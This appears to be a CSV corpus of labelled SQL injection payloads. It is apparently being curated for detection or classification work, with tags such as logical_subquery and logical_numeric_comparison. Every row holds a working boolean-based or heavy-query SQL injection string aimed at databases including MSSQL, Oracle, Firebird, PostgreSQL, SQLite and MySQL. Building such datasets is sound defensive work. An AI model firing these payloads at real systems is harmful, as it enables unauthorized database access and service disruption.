user_corpus_source_row,payload_as_provided,original_label,prior_filter_evidence,source_type,boolean_family_confirmed,behavior_confirmed,root_id,y_complexity,notes
5095,"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5103,-9650'  )   or 1390  =  3209,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5104,-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5108,-4900'   )    )    or 7208  =  3236,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5117,1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5136,-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5148,"1'||  (  select 'pzto' from dual where 7338  =  7338 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5171,"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5179,"1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5180,"1%""   )    )     )   and 9198  =  9198--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5193,-3960' or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5217,-9708' where 8150  =  8150 or 6872  =  6872--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5221,"1"" where 2221  =  2221 and 5318  =  8398--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5223,-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5230,-1730' or 8571  =  8571--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5232,1'  )   where 5491  =  5491 and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5239,-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5243,1' in boolean mode  )   and 5725  =  5552#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5254,-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5256,-9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5257,"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""lide""  =  ""lide",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5259,1'  )   as ubvf where 5923  =  5923 and 8490  =  4925--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5272,1' where 9583  =  9583 and 5319  =  7670#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5281,"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5293,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5300,-9331' or   (  4519  =  2912  )  *2912 and 'rddk'  =  'rddk,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5306,"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5310,"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5313,"1""   )    )    as wwqj where 3249  =  3249 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5326,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5327,"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5333,-6081 where 3681  =  3681 or 2603  =  3138--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5341,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5349,"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5350,1' where 3188  =  3188 and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5355,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5360,-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5362,-8812 or 6872  =  6872# dflr,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5364,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5365,1 and   (  3020  =  3020  )  *6703-- zsnl,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5372,1' where 7882  =  7882 and 6663  =  4524--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5392,1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5393,-6757'   )    )     )   or 4524  =  3696,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5395,-6586'   )    )    or 2021  =  2996,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5398,"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5407,"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5419,"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5428,"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5430,"1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5433,1 where 3357  =  3357 and   (  9492  =  4334  )  *4334--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5439,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5440,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5442,-2866'   )    )    or 4491  =  9429#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5443,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5447,-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5448,-3339' or 8571  =  8571--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5451,1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5456,"-6848""   )    )    or 4071  =  5312",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5462,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5469,"1""   )    )    and 9800  =  8713",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5480,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5500,-4562'  )   or 3038  =  3038,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5517,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5518,"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1,logical_numeric_comparison;logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5522,"1""   )    )    as rign where 1604  =  1604 and 3661  =  3054--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5524,-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5528,1%'   )    )    and 7533  =  7533 and    (    (   '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5529,"-9858"" or 8592  =  8553",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5531,-3862'  )   or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5532,1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,1,logical_numeric_comparison;boolean_case_or_if,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5547,-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5563,"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5569,-7772'   )    )    or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5575,"-4462%""  )   or 8571  =  8571--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5583,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5585,-2527   )    )    as oqpy where 7468  =  7468 or 3038  =  3038,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5588,"1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5596,"-2759%""   )    )    or 7769  =  1249#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5599,"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5611,-5356'  )   or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5617,-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5633,"1   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5642,"-9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5651,1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5665,"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5670,"1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5672,-2233' or   (  1807  =  7274  )  *7274,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5688,"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5689,"-5972"" or 8509  =  3448#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5693,-7775 or 8571  =  8571--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5701,1  )   and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5726,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5730,"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5738,"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5754,"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5765,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5773,"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""abcw""  =  ""abcw",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5781,1%'   )    )    and 7989  =  3457,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5785,1'  )   and 2577  =  7094,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5787,-1587'  )   or 8339  =  5540,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5788,-3748' where 9292  =  9292 or 3337  =  2859#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5790,"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5800,"-7295""  )   or 9323  =  9323#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5809,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5812,1 where 8578  =  8578 and 4770  =  4474--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5819,1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5823,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5828,-1470'   )    )     )   or 9323  =  9323#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5831,"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5832,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5836,-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5838,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5839,"1   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   9313  =  9313",1,logical_numeric_comparison;boolean_case_or_if,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5844,"-9265""  )   or 7834  =  1685",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5858,-2316'   )    )     )   or 8519  =  6010,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
5882,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,1,logical_numeric_comparison;boolean_case_or_if,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
